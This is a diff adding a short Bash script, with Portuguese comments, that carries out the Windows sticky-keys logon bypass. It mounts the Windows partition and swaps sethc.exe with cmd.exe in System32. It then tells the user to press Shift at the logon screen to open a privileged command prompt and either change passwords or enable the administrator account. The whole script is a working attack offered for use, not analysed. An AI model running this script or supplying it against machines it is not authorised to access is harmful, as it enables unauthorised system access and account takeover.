@@ -1,0 +1,19 @@
+#!/bin/bash      
+
+#Para executar esse script crie a pasta /mnt/disk, monte a partição do windows nessa pasta 
+#Execute ./changecmd
+echo "Acessando diretório Windows..."
+sleep 2
+ 
+cd /mnt/disk/Windows/System32/
+echo "Executando as mudanças.."
+      mv cmd.exe cmd1
+      mv sethc.exe sethc1
+      mv cmd1 sethc.exe
+      mv sethc1 cmd.exe
+echo "PRONTO"
+sleep 2
+clear
+echo "Agora reinicie e depois na tela de logon pressione a tecla shift até aparecer o prompt do windows"
+echo "Execute 'control userpasswords2'"
+echo "Caso dê erro, execute 'net user adiminstrador /active:yes' e acesse como administrador"
